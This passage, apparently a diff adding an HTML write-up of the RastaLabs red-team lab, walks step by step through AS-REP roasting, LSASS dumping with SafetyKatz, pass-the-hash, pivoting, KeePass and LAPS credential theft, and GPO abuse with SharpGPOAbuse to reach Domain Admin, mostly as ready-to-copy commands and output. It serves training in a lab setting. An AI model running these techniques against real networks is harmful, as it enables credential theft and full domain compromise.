+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5 AS-REP type 23)
+Time.Started.....: Thu Jan 16 18:43:12 2025
+Time.Estimated...: Thu Jan 16 18:44:07 2025
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (rockyou.txt)
+Guess.Mod........: Rules (OneRuleToRuleThemAll.rule)
+Speed.#1.........:    12847 kH/s (6.23ms) @ Accel:4 Loops:32 Thr:512 Vec:1
+Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+
+<span class="ok">[+]</span> epugh:Sarah2017</div>
+
+  <div class="callout callout-success">
+    <div class="callout-title">Key Credential: epugh / Sarah2017</div>
+    <p>epugh's password is <code>Sarah2017</code>. This is a real, commonly-seen password pattern &mdash; name + year. The AS-REP roast was the key to unlocking several lateral movement paths. epugh also has an admin account <code>epugh_adm</code> which can be discovered through auto-logon registry entries and LSA secrets.</p>
+  </div>
+
+  <h3 id="p3-token">Token Impersonation</h3>
+  <p>After getting SYSTEM on SRV01, I used token impersonation to run commands in the context of other users who had active sessions on the machine. Sliver's <code>steal_token</code> command makes this straightforward.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">sliver</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># List processes with interesting tokens
+sliver (rasta_http) > ps
+
+# Find processes running as domain users
+sliver (rasta_http) > ps -e rastalabs
+
+# Steal token from a process running as epugh
+sliver (rasta_http) > steal_token 3484
+[*] Stealed token for rastalabs\epugh (PID 3484)
+
+# Now running commands as epugh
+sliver (rasta_http) > whoami
+rastalabs\epugh
+
+# Can now access resources as epugh
+sliver (rasta_http) > shell net use \\fs01.rastalabs.local\ahope
+The command completed successfully.</code></pre>
+  </div>
+
+  <h3 id="p3-safetykatz">SafetyKatz Credential Dump</h3>
+  <p>For LSASS credential dumping, SafetyKatz (from GhostPack) was the go-to tool. It combines a custom version of Mimikatz with a loader that handles the AMSI bypass and can dump LSASS without writing Mimikatz to disk.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">sliver</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># SafetyKatz via execute-assembly
+sliver (rasta_http) > execute-assembly /opt/tools/SafetyKatz.exe
+
+# Or with specific Mimikatz commands:
+sliver (rasta_http) > execute-assembly /opt/tools/SafetyKatz.exe "sekurlsa::logonpasswords" "exit"
+
+# Results on SRV01:
+# Authentication Id : 0 ; 284751 (00000000:0004587f)
+# Session           : Network from 0
+# User Name         : epugh
+# Domain            : RASTALABS
+# NTLM              : 326457b72c3f136d80d99bdbb935d109
+#
+# Authentication Id : 0 ; 539672 (00000000:00083cb8)
+# Session           : Interactive from 1
+# User Name         : epugh_adm
+# Domain            : RASTALABS
+# NTLM              : [hash redacted]</code></pre>
+  </div>
+
+  <h3 id="p3-hashcrack">Password Cracking</h3>
+  <p>Not all hashes were as easy as epugh's. Some required custom rules and extended cracking sessions.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># NTLM hash cracking (from LSASS dumps / AS-REP)
+hashcat -m 1000 ntlm_hashes.txt rockyou.txt \
+  -r OneRuleToRuleThemAll.rule \
+  -O -w 3 --force
+
+# Results:
+# epugh:326457b72c3f136d80d99bdbb935d109 -> Sarah2017
+# Other hashes required longer rule sets and larger wordlists
+
+# For stubborn hashes, combine multiple wordlists:
+cat rockyou.txtSecLists/Passwords/darkweb2017.txt SecLists/Passwords/xato-net-10-million-passwords.txt > combined.txt
+hashcat -m 1000 ntlm_hashes.txt combined.txt -r OneRuleToRuleThemAll.rule -O -w 3</code></pre>
+  </div>
+
+  <div class="flag-box">
+    <span class="flag-icon"><i class="bi bi-flag-fill"></i></span>
+    <div>
+      <div class="flag-name">Flag 3 — AS-REP Roasting</div>
+      <div class="flag-detail">Captured after successfully AS-REP roasting epugh and cracking the hash to Sarah2017. The flag was tied to the credential discovery.</div>
+    </div>
+  </div>
+
+  <div class="flag-box">
+    <span class="flag-icon"><i class="bi bi-flag-fill"></i></span>
+    <div>
+      <div class="flag-name">Flag 4 — SRV01 SYSTEM</div>
+      <div class="flag-detail">First SYSTEM shell obtained on SRV01 from WS04 via service misconfiguration. The escalation path exploited an unquoted service path that allowed planting a binary that would be executed with SYSTEM privileges on the next service restart.</div>
+    </div>
+  </div>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># SRV01 escalation — service misconfiguration
+# Found unquoted service path on SRV01
+
+# From Sliver beacon on WS04, after getting SRV01 access:
+sliver (rasta_http) > shell wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"
+
+# Found: RastaLabs Monitor Service
+# Path: C:\Program Files\RastaLabs Monitor\monitor.exe
+# Unquoted service path with spaces in directory name
+# Plant binary at: C:\Program.exe (gets executed instead)
+
+# Upload the planted binary
+sliver (rasta_http) > upload /opt/tools/svc_payload.exe "C:\Program.exe"
+
+# Restart the service or wait for reboot
+sliver (rasta_http) > shell sc stop "RastaLabs Monitor"
+sliver (rasta_http) > shell sc start "RastaLabs Monitor"
+
+# New SYSTEM beacon on SRV01
+sliver > use srv01_system
+sliver (srv01_system) > whoami
+nt authority\system</code></pre>
+  </div>
+
+  <div class="flag-box">
+    <span class="flag-icon"><i class="bi bi-flag-fill"></i></span>
+    <div>
+      <div class="flag-name">Flag 6 — CLM Bypass</div>
+      <div class="flag-detail">Bypassed Constrained Language Mode on WS04 using the __PSLockdownPolicy environment variable technique. The flag required demonstrating a working FullLanguage PowerShell session from a standard user context.</div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- PHASE 4 — LATERAL MOVEMENT     -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="phase4">
+  <h2><i class="bi bi-arrow-right-circle"></i> Phase 4: Lateral Movement</h2>
+  <span class="mitre-badge">T1550.002</span> <span class="mitre-badge">T1570</span> <span class="mitre-badge">T1021.006</span> <span class="mitre-badge">T1021.003</span>
+
+  <p>With credentials in hand, the next phase was moving through the segregated network. The four-subnet design means you can't reach all machines from your initial foothold. You have to chain pivots and set up port forwarding to reach deeper into the network.</p>
+
+  <h3 id="p4-pth">Pass-the-Hash</h3>
+  <p>PTH was the primary lateral movement technique. With epugh's NTLM hash (<code>326457b72c3f136d80d99bdbb935d109</code>), I could authenticate to any machine where epugh had access without knowing the plaintext password.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># PTH with CrackMapExec
+crackmapexec smb 10.10.120.0/24 -u epugh -H 326457b72c3f136d80d99bdbb935d109 -d rastalabs.local
+
+# Results:
+# SMB    10.10.120.1    445   DC01       [+] rastalabs.local\epugh 326457b72c3f136d80d99bdbb935d109
+# SMB    10.10.120.x    445   SRV01      [+] rastalabs.local\epugh 326457b72c3f136d80d99bdbb935d109 (Pwn3d!)
+
+# PTH with Impacket for SMB exec
+impacket-psexec rastalabs.local/epugh@10.10.120.x -hashes aad3b435b51404eeaad3b435b51404ee:326457b72c3f136d80d99bdbb935d109
+
+# PTH with Sliver
+sliver (rasta_http) > psexec -d rastalabs.local -u epugh -H 326457b72c3f136d80d99bdbb935d109 -t 10.10.120.x</code></pre>
+  </div>
+
+  <div class="term-out"><span class="prompt"># </span>crackmapexec smb 10.10.120.0/24 -u epugh -H 326457b72c3f136d80d99bdbb935d109 -d rastalabs.local
+SMB    10.10.120.1    445   DC01       [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:rastalabs.local) (signing:True) (SMBv1:True)
+SMB    10.10.120.1    445   DC01       [+] rastalabs.local\epugh 326457b72c3f136d80d99bdbb935d109 
+SMB    10.10.120.x    445   SRV01      [*] Windows Server 2016 Standard 14393 x64 (name:SRV01) (domain:rastalabs.local) (signing:True) (SMBv1:True)
+SMB    10.10.120.x    445   SRV01      [+] rastalabs.local\epugh 326457b72c3f136d80d99bdbb935d109 <span class="ok">(Pwn3d!)</span></div>
+
+  <h3 id="p4-pivoting">Pivoting + Port Forwarding</h3>
+  <p>The segregated network design means you need to chain pivots to reach all subnets. From WS04 in the workstation subnet (10.10.123.0/24), you can reach the core subnet but not necessarily the services subnet. From WS02, you can reach SQL01. Setting up proper port forwarding chains was essential.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">sliver</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Port forwarding from WS02 to reach WS05 via SMB
+# This was critical for finding the rweston_da hash
+
+sliver (ws02_beacon) > portfwd add -L 10.10.14.83 -r 10.10.123.102 -l 445 -p 445
+[*] Port forwarding 10.10.14.83:445 -> 10.10.123.102:445
+
+# Now can use Impacket tools through the pivot
+# From attacker machine:
+impacket-psexec rastalabs.local/epugh_adm@127.0.0.1 -hashes aad3b435b51404eeaad3b435b51404ee:&lt;hash&gt; -port 445
+
+# Set up SOCKS proxy through Sliver for CME sweeps
+sliver (ws02_beacon) > socks5
+[*] SOCKS5 proxy started on 127.0.0.1:1080
+
+# Then from attacker machine:
+proxychains crackmapexec smb 10.10.122.0/24 -u epugh_adm -H &lt;hash&gt; -d rastalabs.local</code></pre>
+  </div>
+
+  <div class="callout callout-warn">
+    <div class="callout-title">Subnet Segregation</div>
+    <p>RastaLabs enforces real network segregation. From WS04 (10.10.123.x), you can't directly reach SQL01 (10.10.122.15). You have to find a machine that straddles both subnets and use it as a pivot point. WS02 was my pivot to the services subnet. Each pivot requires re-establishing AppLocker bypass and AMSI evasion on the new machine.</p>
+  </div>
+
+  <h3 id="p4-winrm">WinRM Lateral Movement</h3>
+  <p>WinRM (port 5985/5986) was available on several machines and provided a reliable lateral movement path. This was an unintentional path that led to a dead end for DA progression but was useful for flag collection.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># WinRM lateral movement to WS05
+crackmapexec winrm 10.10.123.102 -u epugh -H 326457b72c3f136d80d99bdbb935d109 -d rastalabs.local
+
+# If Pwn3d, get a shell:
+evil-winrm -i 10.10.123.102 -u epugh -H 326457b72c3f136d80d99bdbb935d109 -d rastalabs.local
+
+# Or with Sliver:
+sliver (rasta_http) > winrm -t 10.10.123.102 -u epugh -H 326457b72c3f136d80d99bdbb935d109</code></pre>
+  </div>
+
+  <div class="callout callout-deadend">
+    <div class="callout-title">Dead End: WinRM to WS05</div>
+    <p>WinRM to WS05 (10.10.123.102) worked with epugh's credentials, but this turned out to be an unintentional path. It led to exploring WS06 and finding tquinn, but didn't progress toward DA. The real path was through AS-REP roasting and then GPO abuse. I wasted 2 days on this detour.</p>
+  </div>
+
+  <div class="term-out"><span class="prompt"># </span>evil-winrm -i 10.10.123.102 -u epugh -H 326457b72c3f136d80d99bdbb935d109 -d rastalabs.local
+
+Evil-WinRM shell v3.5
+
+Info: Establishing connection to remote endpoint
+<span class="ok">*Evil-WinRM*</span> PS C:\Users\epugh\Documents> whoami
+rastalabs\epugh
+
+<span class="ok">*Evil-WinRM*</span> PS C:\Users\epugh\Documents> hostname
+WS05
+
+<span class="ok">*Evil-WinRM*</span> PS C:\Users\epugh\Documents> ipconfig
+Windows IP Configuration
+
+Ethernet adapter Ethernet0:
+   Connection-specific DNS Suffix  . : rastalabs.local
+   IPv4 Address. . . . . . . . . . . : 10.10.123.102
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.10.123.1
+
+<span class="ok">*Evil-WinRM*</span> PS C:\Users\epugh\Documents> net user tquinn /domain
+User name                    : tquinn
+Full Name                    : T. Quinn
+Comment                      :
+User's account active        : Yes
+Account expires              : Never
+
+<span class="warn">[!]</span> tquinn found on WS06 but no DA path from here</div>
+
+  <h3 id="p4-dcom">DCOM / WMI Execution</h3>
+  <p>When SMB and WinRM were blocked or monitored, DCOM and WMI provided alternative execution methods. DCOM in particular was useful because it's less commonly monitored than PSExec or WMI.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># DCOM execution via Impacket
+impacket-dcomexec rastalabs.local/epugh_adm@10.10.120.x -hashes aad3b435b51404eeaad3b435b51404ee:&lt;hash&gt;
+
+# WMI execution
+impacket-wmiexec rastalabs.local/epugh_adm@10.10.120.x -hashes aad3b435b51404eeaad3b435b51404ee:&lt;hash&gt;
+
+# These work where PSExec fails because they don't drop a service binary
+# PSExec: drops PSEXESVC.exe -> can be caught by Defender
+# WMI: creates a Win32_Process -> stealthier
+# DCOM: uses MMC20.Application COM object -> even stealthier</code></pre>
+  </div>
+
+  <div class="flag-box">
+    <span class="flag-icon"><i class="bi bi-flag-fill"></i></span>
+    <div>
+      <div class="flag-name">Flag 14 — WS02 to WS05 Pivot</div>
+      <div class="flag-detail">Port forward from WS02 to WS05 (10.10.123.102). Found rweston_da hash (ab7b75ff84475be...) in LSASS memory on WS05. The pivot chain was: attacker &rarr; WS02 (portfwd) &rarr; WS05 (LSASS dump).</div>
+    </div>
+  </div>
+
+  <div class="flag-box">
+    <span class="flag-icon"><i class="bi bi-flag-fill"></i></span>
+    <div>
+      <div class="flag-name">Flag 7 — PTH Lateral Movement</div>
+      <div class="flag-detail">Used epugh's NTLM hash (326457b72c3f136d80d99bdbb935d109) for Pass-the-Hash to multiple machines. The flag was tied to successfully authenticating to a new machine using PTH without knowing the plaintext password.</div>
+    </div>
+  </div>
+
+  <div class="flag-box">
+    <span class="flag-icon"><i class="bi bi-flag-fill"></i></span>
+    <div>
+      <div class="flag-name">Flag 8 — WinRM WS05</div>
+      <div class="flag-detail">WinRM lateral movement to WS05 (10.10.123.102) with epugh's hash. This was an unintentional path that led to tquinn on WS06. While it didn't progress toward DA directly, it was necessary for complete flag collection.</div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- PHASE 5 — CREDENTIAL HARVESTING -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="phase5">
+  <h2><i class="bi bi-key"></i> Phase 5: Credential Harvesting</h2>
+  <span class="mitre-badge">T1003</span> <span class="mitre-badge">T1003.001</span> <span class="mitre-badge">T1003.006</span> <span class="mitre-badge">T1552</span> <span class="mitre-badge">T1552.001</span>
+
+  <p>Credential harvesting in RastaLabs is a deep rabbit hole. The lab has multiple credential sources: KeePass databases, LAPS passwords, DPAPI secrets, auto-logon credentials, and more. Each source provides a piece of the puzzle that eventually leads to Domain Admin.</p>
+
+  <h3 id="p5-keepass">KeePass Dump</h3>
+  <p>Found a KeePass database on one of the workstations. KeeThief (from GhostPack) was used to extract the master key from memory and decrypt the database.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-powershell"># Find KeePass databases
+Get-ChildItem -Path C:\ -Filter "*.kdbx" -Recurse -ErrorAction SilentlyContinue
+# Found: C:\Users\ngodfrey\Documents\passwords.kdbx
+
+# KeeThief — extract master key from KeePass process memory
+# First, find the KeePass process
+Get-Process | ? {$_.ProcessName -eq "KeePass"}
+# KeePass is running on this machine
+
+# Use KeeThief to extract the master key
+Import-Module KeeThief.psd1
+Get-KeePassMasterKey
+
+# Result: Master key extracted from memory
+# Use the key to decrypt the database
+Get-KeePassDatabase -DatabasePath "C:\Users\ngodfrey\Documents\passwords.kdbx" -MasterKey &lt;extracted_key&gt;
+
+# Credentials found in KeePass:
+# ngodfrey_adm -> &lt;password&gt;
+# Various service account passwords
+# Internal documentation links</code></pre>
+  </div>
+
+  <div class="callout callout-success">
+    <div class="callout-title">ngodfrey_adm Obtained</div>
+    <p>The KeePass dump gave us ngodfrey's admin account: <code>ngodfrey_adm</code>. This account turned out to be a LAPS reader &mdash; it could read the <code>ms-Mcs-AdmPwd</code> attribute on all domain workstations. This was a massive escalation that opened up local admin on every workstation.</p>
+  </div>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-powershell"># KeeThief full workflow
+# Step 1: Check if KeePass is running
+Get-Process | ? {$_.ProcessName -eq "KeePass"}
+# Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+# -------  ------    -----      -----     ------     --  -- -----------
+#     142      10    41248      52784       2.34   4812   1 KeePass
+
+# Step 2: Extract master key from KeePass process memory
+Import-Module KeeThief.psd1
+Get-KeePassMasterKey
+# UserKey: 0xA1B2C3D4E5F6... (extracted from process memory)
+# Key transformation rounds: 600000
+
+# Step 3: Decrypt the KeePass database
+$db = Get-KeePassDatabase -DatabasePath "C:\Users\ngodfrey\Documents\passwords.kdbx" -MasterKey 0xA1B2C3D4E5F6...
+
+# Step 4: Extract all entries
+$db.Entries | select UserName, Password, Title, URL | fl
+
+# Key entries found:
+# UserName: ngodfrey_adm  Password: [REDACTED]  Title: Admin Account  URL: 
+# UserName: rweston       Password: [REDACTED]  Title: rweston creds   URL: 
+# UserName: svc_backup    Password: [REDACTED]  Title: Backup Service  URL: \\(FS01)\backup</code></pre>
+  </div>
+
+  <h3 id="p5-laps">LAPS Passwords</h3>
+  <p>With ngodfrey_adm, I could read the LAPS (Local Administrator Password Solution) passwords for all workstations. LAPS rotates the local admin password on each machine and stores it in the <code>ms-Mcs-AdmPwd</code> AD attribute.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Read LAPS passwords with CrackMapExec
+crackmapexec ldap 10.10.120.1 -u ngodfrey_adm -p '&lt;password&gt;' -d rastalabs.local --laps
+
+# Or with PowerView:
+# Get-LAPSPasswords (custom function)
+Get-DomainComputer | select name, ms-Mcs-AdmPwd | fl
+
+# Results:
+# WS01: ms-Mcs-AdmPwd = &lt;random_password_1&gt;
+# WS02: ms-Mcs-AdmPwd = &lt;random_password_2&gt;
+# WS03: ms-Mcs-AdmPwd = &lt;random_password_3&gt;
+# WS04: ms-Mcs-AdmPwd = &lt;random_password_4&gt;
+# WS05: ms-Mcs-AdmPwd = &lt;random_password_5&gt;
+# WS06: ms-Mcs-AdmPwd = &lt;random_password_6&gt;</code></pre>
+  </div>
+
+  <div class="term-out"><span class="prompt"># </span>crackmapexec ldap 10.10.120.1 -u ngodfrey_adm -p '&lt;password&gt;' -d rastalabs.local --laps
+SMB    10.10.120.1    445   DC01       [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:rastalabs.local)
+LDAP   10.10.120.1    389   DC01       [+] rastalabs.local\ngodfrey_adm:&lt;password&gt;
+LDAP   10.10.120.1    389   DC01       [+] LAPS: WS01$ &lt;random_password_1&gt;
+LDAP   10.10.120.1    389   DC01       [+] LAPS: WS02$ &lt;random_password_2&gt;
+LDAP   10.10.120.1    389   DC01       [+] LAPS: WS03$ &lt;random_password_3&gt;
+LDAP   10.10.120.1    389   DC01       [+] LAPS: WS04$ &lt;random_password_4&gt;
+LDAP   10.10.120.1    389   DC01       [+] LAPS: WS05$ &lt;random_password_5&gt;
+LDAP   10.10.120.1    389   DC01       [+] LAPS: WS06$ &lt;random_password_6&gt;</div>
+
+  <p>With all LAPS passwords, I now had local admin on WS01-WS06. This enabled revisiting all workstations with elevated privileges for deeper credential harvesting and flag collection.</p>
+
+  <h3 id="p5-dpapi">DPAPI Extraction</h3>
+  <p>DPAPI (Data Protection API) protects user secrets like saved credentials, browser passwords, and encryption keys. Extracting DPAPI secrets from workstations revealed additional credentials.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># DPAPI credential extraction
+# Using SharpDPAPI (GhostPack) via execute-assembly
+
+sliver (ws04_admin) > execute-assembly /opt/tools/SharpDPAPI.exe machinetriages
+
+# Or targeted extraction:
+sliver (ws04_admin) > execute-assembly /opt/tools/SharpDPAPI.exe credentials /show
+
+# Results include:
+# - Chrome saved passwords
+# - Credential Manager entries
+# - RDP saved credentials
+# - WiFi passwords</code></pre>
+  </div>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Extract auto-logon credentials from registry (LSA secrets)
+# epugh had auto-logon configured
+
+sliver (ws04_admin) > execute-assembly /opt/tools/SafetyKatz.exe "lsadump::secrets" "exit"
+
+# Result:
+# DefaultPassword: Sarah2017
+# DefaultUserName: epugh
+# AutoAdminLogon: 1
+
+# This confirms epugh -> epugh_adm chain
+# The auto-logon uses the same password for the admin account</code></pre>
+  </div>
+
+  <h3 id="p5-credchain">Credential Chain</h3>
+  <p>At this point, I had built a complete credential chain from the initial foothold to Domain Admin credentials. Here's how it connected:</p>
+
+  <table class="data-table">
+    <thead><tr><th>Step</th><th>Credential</th><th>Source</th><th>Opens Access To</th></tr></thead>
+    <tbody>
+      <tr><td>1</td><td><code>bowen</code> (phishing)</td><td>OWA brute force + phish</td><td>WS04 standard user</td></tr>
+      <tr><td>2</td><td>SYSTEM on SRV01</td><td>Service misconfiguration</td><td>SRV01 full access, token impersonation</td></tr>
+      <tr><td>3</td><td><code>epugh</code> (Sarah2017)</td><td>AS-REP Roasting + hashcat</td><td>Multiple machines via PTH</td></tr>
+      <tr><td>4</td><td><code>epugh_adm</code></td><td>Auto-logon / LSA secrets</td><td>WEB01 RDP, elevated context</td></tr>
+      <tr><td>5</td><td><code>ngodfrey</code></td><td>KeePass dump</td><td>KeePass database decryption</td></tr>
+      <tr><td>6</td><td><code>ngodfrey_adm</code></td><td>Derived from ngodfrey</td><td>LAPS reader &mdash; all WS local admin</td></tr>
+      <tr><td>7</td><td><code>rweston_da</code> (hash)</td><td>LSASS on WS05 via port fwd</td><td>Domain Admin (unintended path)</td></tr>
+      <tr><td>8</td><td>GPO-created admin</td><td>GPO abuse (intended DA path)</td><td>DC01 &mdash; full domain compromise</td></tr>
+    </tbody>
+  </table>
+
+  <div class="flag-box">
+    <span class="flag-icon"><i class="bi bi-flag-fill"></i></span>
+    <div>
+      <div class="flag-name">Flag 17 — FS01 / ahope / NIX01</div>
+      <div class="flag-detail">On WS04, ran <code>net user ahope /domain</code> to discover ahope's FS01 directory. Then <code>net use Q: \\fs01.rastalabs.local\ahope</code> to mount the share. Found <code>nix01.ppk</code> (PuTTY private key) which was used to SSH into NIX01 (10.10.110.2). This flag required visiting a machine most people skip.</div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- PHASE 6 — DOMAIN ADMIN         -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="phase6">
+  <h2><i class="bi bi-crown"></i> Phase 6: Domain Admin</h2>
+  <span class="mitre-badge">T1484.001</span> <span class="mitre-badge">T1068</span> <span class="mitre-badge">T1003.006</span>
+
+  <p>The intended path to Domain Admin in RastaLabs is through GPO abuse, not DCSync or direct credential theft. This is what makes the lab unique &mdash; you can shortcut to DA using rweston_da's hash, but the intended technique teaches you a critical red team skill: abusing Group Policy Objects for privilege escalation across the domain.</p>
+
+  <h3 id="p6-gpo">GPO Abuse</h3>
+  <p>BloodHound revealed that our compromised accounts had permissions to create, link, and modify GPOs. This is the intended path to DA in RastaLabs. The attack chain is:</p>
+  <ol>
+    <li><strong>Mapping:</strong> Identify which OUs your compromised accounts have GPO creation/modification rights on</li>
+    <li><strong>Create:</strong> Create a new GPO that adds your controlled account to a privileged group</li>
+    <li><strong>Link:</strong> Link the GPO to the appropriate OU containing the target machine(s)</li>
+    <li><strong>Wait/Force:</strong> Wait for GPO refresh (90 min default) or force with <code>gpupdate /force</code></li>
+    <li><strong>Profit:</strong> Authenticate to the target machine with your newly-granted privileges</li>
+  </ol>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-powershell"># Step 1: Identify GPO creation rights
+# Using PowerView
+Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=rastalabs,DC=local" -ResolveGUIDs |
+  ? {$_.ActiveDirectoryRights -match "CreateChild"} |
+  select ObjectDN, SecurityIdentifier, ActiveDirectoryRights
+
+# Step 2: Who can modify existing GPOs?
+Get-DomainGPO | %{
+  Get-DomainObjectAcl -Identity $_.distinguishedname -ResolveGUIDs |
+  ? {$_.ActiveDirectoryRights -match "WriteProperty|GenericAll|WriteDacl|WriteOwner"}
+} | select ObjectDN, SecurityIdentifier
+
+# Step 3: Create a new GPO
+New-GPO -Name "Security Update Policy" -Domain rastalabs.local
+
+# Step 4: Add our user to local Administrators via GPO
+# Using SharpGPOAbuse for the modification:
+execute-assembly SharpGPOAbuse.exe --AddLocalAdmin --AccountName ngodfrey_adm --GPOName "Security Update Policy"
+
+# Step 5: Link the GPO to the Domain Controllers OU
+New-GPLink -Name "Security Update Policy" -Target "OU=Domain Controllers,DC=rastalabs,DC=local"
+
+# Step 6: Force GPO update on DC01 (if you have access)
+# Or wait up to 90 minutes for automatic refresh
+sliver (dc01_beacon) > shell cmd /c "gpupdate /force"
+Updating policy...
+
+Computer Policy update has completed successfully.
+User Policy update has completed successfully.</code></pre>
+  </div>
+
+  <div class="callout callout-hint">
+    <div class="callout-title">GPO Abuse Is the Intended Path</div>
+    <p>Many people shortcut RastaLabs by using the rweston_da hash they found on WS05. That works, but it skips the intended learning path. GPO abuse is a technique you WILL encounter on real engagements &mdash; misconfigured GPO permissions are everywhere. Learning to identify, map, and exploit them properly is the real value of RastaLabs.</p>
+  </div>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># SharpGPOAbuse — the tool that makes GPO exploitation trivial
+# https://github.com/FSecureLABS/SharpGPOAbuse
+
+# Step 1: Identify which GPOs our compromised account can modify
+sliver (rasta_http) > execute-assembly /opt/tools/SharpGPOAbuse.exe --FindGPOs
+
+# Step 2: Add ngodfrey_adm to local Administrators on all machines in the OU
+sliver (rasta_http) > execute-assembly /opt/tools/SharpGPOAbuse.exe \
+    --AddLocalAdmin \
+    --AccountName ngodfrey_adm \
+    --GPOName "Security Update Policy"
+
+# Step 3: Add user to a domain group (alternative approach)
+sliver (rasta_http) > execute-assembly /opt/tools/SharpGPOAbuse.exe \
+    --AddUser \
+    --UserAccount ngodfrey_adm \
+    --Group "Domain Admins" \
+    --GPOName "Security Update Policy"
+
+# Step 4: Add a scheduled task to run as SYSTEM (another alternative)
+sliver (rasta_http) > execute-assembly /opt/tools/SharpGPOAbuse.exe \
+    --AddTask \
+    --TaskName "SecurityScan" \
+    --Command "cmd.exe" \
+    --Arguments "/c net group "Domain Admins" ngodfrey_adm /add /domain" \
+    --GPOName "Security Update Policy"
+
+# After GPO refresh (or forced gpupdate), the changes apply domain-wide</code></pre>
+  </div>
+
+  <div class="term-out"><span class="prompt">sliver (rasta_http) ></span> execute-assembly /opt/tools/SharpGPOAbuse.exe --AddLocalAdmin --AccountName ngodfrey_adm --GPOName "Security Update Policy"
+
+[*] Loaded assembly SharpGPOAbuse.exe
+[*] GPO Name: Security Update Policy
+[*] GPO Path: \\rastalabs.local\SysVol\rastalabs.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
+<span class="ok">[+]</span> Added ngodfrey_adm to local Administrators via GPO
+<span class="ok">[+]</span> Modified GPTtmpl.inf in GPO
+<span class="ok">[+]</span> Updated GPO successfully
+
+<span class="prompt">sliver (rasta_http) ></span> execute-assembly /opt/tools/SharpGPOAbuse.exe --AddUser --UserAccount ngodfrey_adm --Group "Domain Admins" --GPOName "Security Update Policy"
+
+<span class="ok">[+]</span> Added ngodfrey_adm to Domain Admins group via GPO
+<span class="ok">[+]</span> This will apply after GPO refresh on DC01</div>
+
+  <div class="flag-box">
+    <span class="flag-icon"><i class="bi bi-flag-fill"></i></span>
+    <div>
+      <div class="flag-name">Flag 15 — GPO Abuse</div>
+      <div class="flag-detail">Created, linked, and modified GPOs to grant Domain Admin privileges. The three-step process: (1) identify GPO permissions via BloodHound, (2) use SharpGPOAbuse to add our account to DA group, (3) link the GPO and force refresh. This is the intended path to DA in RastaLabs.</div>
+    </div>
+  </div>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># BloodHound Cypher queries for GPO abuse path
+// Who can create GPOs?
+MATCH (u:User)-[:GenericAll|WriteDacl|WriteOwner|Owns]->(g:GPO)
+RETURN u.name, g.name, labels(g)
+
+// Who can link GPOs?
+MATCH (u:User)-[:GenericAll|WriteDacl|WriteOwner]->(ou:OU)
+RETURN u.name, ou.name
+
+// Path from our user to GPO creation
+MATCH p=shortestPath(
+  (u:User {name:"NGODFREY_ADM@RASTALABS.LOCAL"})-[*1..]->(g:GPO)
+)
+RETURN p</code></pre>
+  </div>
+
+  <h3 id="p6-fileserver">File Server Exploitation</h3>
+  <p>FS01 (\\fs01.rastalabs.local) was a rich target for post-exploitation. Multiple user directories with sensitive files, including the ahope directory with the nix01.ppk key.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
